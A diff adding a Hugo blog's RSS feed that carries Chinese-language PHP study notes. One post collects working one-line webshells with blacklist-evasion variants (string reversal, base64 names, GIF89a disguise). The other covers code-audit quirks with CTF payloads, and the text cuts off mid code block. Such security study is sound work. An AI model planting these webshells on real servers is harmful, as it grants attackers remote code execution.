@@ -1,0 +1,1083 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PHP on BU44ER's BLOG</title><link>https://bu44er.ink/tags/php/</link><description>Recent content in PHP on BU44ER's BLOG</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 13 Oct 2024 15:27:04 +0800</lastBuildDate><atom:link href="https://bu44er.ink/tags/php/index.xml" rel="self" type="application/rss+xml"/><item><title>php一句话木马以及相关免杀</title><link>https://bu44er.ink/p/0dixy59j/</link><pubDate>Sun, 13 Oct 2024 15:27:04 +0800</pubDate><guid>https://bu44er.ink/p/0dixy59j/</guid><description>&lt;h2 id="基础">基础
+&lt;/h2>&lt;p>&lt;code>&amp;lt;?php @eval($_POST['shell']);?&amp;gt;&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>@ 防止报错&lt;/li>
+&lt;li>eval() 把字符串当作php代码执行&lt;/li>
+&lt;li>&lt;code>$_POST['xyz']&lt;/code> 以post方式获取名为xyz的变量&lt;/li>
+&lt;/ul>
+&lt;p>使用：访问这句木马所在的php文件，以post方式传入 xyz = phpinfo()&lt;/p>
+&lt;ul>
+&lt;li>网页会（执行&lt;code>phpinfo()&lt;/code> 这个函数）返回网页php的版本信息&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="变形">变形
+&lt;/h2>&lt;h3 id="assert">assert
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;assert&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$a&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;shell&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>区别在于 &lt;code>assert&lt;/code> 函数在执行给定代码时，要求代码的结果为布尔类型，而 &lt;code>eval&lt;/code> 函数则可以执行任意有效的 PHP 代码&lt;/li>
+&lt;/ul>
+&lt;h3 id="字符变形">字符变形
+&lt;/h3>&lt;p>使用字符串拼接、大小写混淆、字符串逆序组合而成&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;TR&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;Es&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;sA&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$a&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">strrev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$b&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nv">$c&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;shell&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"># phpinfo();
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;?php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">$a=&amp;#34;of&amp;#34;.&amp;#34;NiP&amp;#34;.&amp;#34;Hp&amp;#34;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">$b=strtolower($a);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">$c=strrev($b);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">@$c();
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>strtolower()&lt;/code> 是 PHP 中的一个内置函数，用于将字符串转换为小写字母&lt;/li>
+&lt;li>&lt;code>strrev()&lt;/code> 字符串反转&lt;/li>
+&lt;/ul>
+&lt;p>注意，字符变形仅仅用于函数名，不能写成 &lt;code>$a=&amp;quot;)(of&amp;quot;.&amp;quot;NiP&amp;quot;.&amp;quot;Hp&amp;quot;;&lt;/code> ，不能把括号一起放入。&lt;/p>
+&lt;p>用解析出来的变量替代函数名，本质上只是&lt;strong>字符的替换&lt;/strong>，绕过黑名单检测，最后“触发”函数的执行需要依赖括号 &lt;code>()&lt;/code> 。假如括号也写在字符变形之中，最终由变量替换产生一串 &lt;code>phpinfo()&lt;/code> 这样的&lt;strong>字符串&lt;/strong>，php 显然不会执行这个&lt;strong>字符串&lt;/strong>，所以必须把括号放在外面。&lt;/p>
+&lt;h3 id="自定义函数">自定义函数
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">fun&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$a&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">@&lt;/span>&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$a&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">fun&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;shell&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="create_function">create_function
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$fun&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">create_function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;shell&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$fun&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>用法：&lt;code>$addFunction = create_function('参数', '函数体');&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="base64_decode-函数">base64_decode 函数
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;YXNzZXJ0&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;shell&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>YXNzZXJ0&lt;/code>是assert的base64编码，&lt;code>base64_decode()&lt;/code>是base64解密函数&lt;/p>
+&lt;h3 id="绕过">绕过&lt;code>&amp;lt;?&lt;/code>
+&lt;/h3>&lt;p>&lt;code>GIF89a? &amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_REQUEST[123])&amp;lt;/script&amp;gt; &lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>GIF89a&lt;/code>: 这是 GIF 图像文件的文件头标识符&lt;/li>
+&lt;li>剩余就是正常的html语言&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="短标签">短标签
+&lt;/h2>&lt;p>&lt;img src="https://bu44er.ink/img/Pasted%20image%2020241013143113.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>short_open_tag 开启以后，可以使用 PHP 的短标签：&lt;code>&amp;lt;? ?&amp;gt;&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>绕过黑名单有 &lt;code>php&lt;/code> 的情况&lt;/li>
+&lt;/ul></description></item><item><title>php代码审计</title><link>https://bu44er.ink/p/8hg4xmol/</link><pubDate>Fri, 04 Oct 2024 01:45:39 +0800</pubDate><guid>https://bu44er.ink/p/8hg4xmol/</guid><description>&lt;h1 id="常见函数">常见函数
+&lt;/h1>&lt;h2 id="is_numeric">&lt;code>is_numeric()&lt;/code>
+&lt;/h2>&lt;p>判断是否为数字&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$var1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">123&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$var2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;3.14&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$var3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;abc&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$var4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;123abc&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">echo&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$var1&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出：1（true）
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">echo&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$var2&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出：0（false）
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">echo&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$var3&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出：0（false）
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">echo&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$var4&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出：0（false）
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="intval">&lt;code>intval()&lt;/code>
+&lt;/h2>&lt;p>字符串转换成十进制整数&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">echo&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出: 123
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">echo&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;+123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出: 123
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">echo&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;123.45&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出: 123
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">echo&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;123abc&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出: 123
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">echo&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出: 0
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">echo&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;12.3abc45&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 输出: 12
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>如果字符串以数字开头，则为开头的数字&lt;/li>
+&lt;li>如果字符串以非数字开头，则为0&lt;/li>
+&lt;/ul>
+&lt;h3 id="php5-的-intval-不识别科学计数">PHP5 的 intval 不识别科学计数
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$num&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2020&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$num&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">2021&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>payload: &lt;code>?num=100e2&lt;/code>&lt;/p>
+&lt;p>在PHP5中， intval 不识别科学计数，遇到 e 直接结束，&lt;code>intval(&amp;quot;100e2&amp;quot;)&lt;/code> 会被识别成 100&lt;/p>
+&lt;ul>
+&lt;li>后续版本中，科学计数字符串转数字时会被自动识别成相应数字&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">echo&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">1e10&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 10000000000
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">echo&lt;/span> &lt;span class="nx">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;1e10&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 10000000000
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="base-参数">base 参数
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="ne">int&lt;/span> &lt;span class="n">intval&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">mixed&lt;/span> &lt;span class="o">$&lt;/span>&lt;span class="k">var&lt;/span> &lt;span class="p">[,&lt;/span> &lt;span class="ne">int&lt;/span> &lt;span class="o">$&lt;/span>&lt;span class="n">base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>如果有第二个base参数 x，表示把第一个字符串参数看成x进制。&lt;/p>
+&lt;p>如果 base参数 = 0，通过检测 var 的格式来决定使用的进制：&lt;/p>
+&lt;ul>
+&lt;li>如果字符串包括了 &amp;ldquo;0x&amp;rdquo; (或 &amp;ldquo;0X&amp;rdquo;) 的前缀，使用 16 进制 (hex)；否则，&lt;/li>
+&lt;li>如果字符串以 &amp;ldquo;0&amp;rdquo; 开始，使用 8 进制(octal)；否则，&lt;/li>
+&lt;li>将使用 10 进制 (decimal)。&lt;/li>
+&lt;/ul>
+&lt;h2 id="show_source">&lt;code>show_source()&lt;/code>
+&lt;/h2>&lt;p>显示指定文件的源代码&lt;/p>
+&lt;hr>
+&lt;h2 id="var_dump">&lt;code>var_dump()&lt;/code>
+&lt;/h2>&lt;p>打印变量的详细信息，包括变量的类型和值&lt;/p>
+&lt;hr>
+&lt;h2 id="scandir">&lt;code>scandir()&lt;/code>
+&lt;/h2>&lt;p>获取指定目录&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>scandir(/)&lt;/code> 获取根目录&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="chr">&lt;code>chr()&lt;/code>
+&lt;/h2>&lt;p>将 ASCII 码转换为对应的字符&lt;/p>
+&lt;ul>
+&lt;li>可拼接：&lt;code>file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="file_get_contents">&lt;code>file_get_contents()&lt;/code>
+&lt;/h2>&lt;p>获取指定路径的&lt;strong>文件的内容&lt;/strong>&lt;/p>
+&lt;hr>
+&lt;h2 id="eval">&lt;code>eval()&lt;/code>
+&lt;/h2>&lt;p>将字符串作为php代码执行&lt;/p>
+&lt;p>&lt;strong>eval()是一个语言构造器，不能被可变函数调用&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">eval&lt;span class="o">(&lt;/span>eval&lt;span class="o">(&lt;/span>...&lt;span class="o">))&lt;/span> &lt;span class="c1">#错误&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">eval&lt;span class="o">(&lt;/span>assert&lt;span class="o">(&lt;/span>eval&lt;span class="o">(&lt;/span>...&lt;span class="o">)))&lt;/span> &lt;span class="c1">#正确&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;?php assert&lt;span class="o">(&lt;/span>POST&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">])&lt;/span> &lt;span class="p">;&lt;/span>&amp;gt; &lt;span class="c1">#错误&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#由于php版本问题，也不能直接用assert构造一句话，所以只能采用eval(assert(eval(...)))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="sizeof">&lt;code>sizeof&lt;/code>
+&lt;/h2>&lt;p>返回&lt;strong>数组&lt;/strong>长度&lt;/p>
+&lt;hr>
+&lt;h2 id="preg_match">&lt;code>preg_match&lt;/code>
+&lt;/h2>&lt;ul>
+&lt;li>[[../../../编程语言/正则表达式]]&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
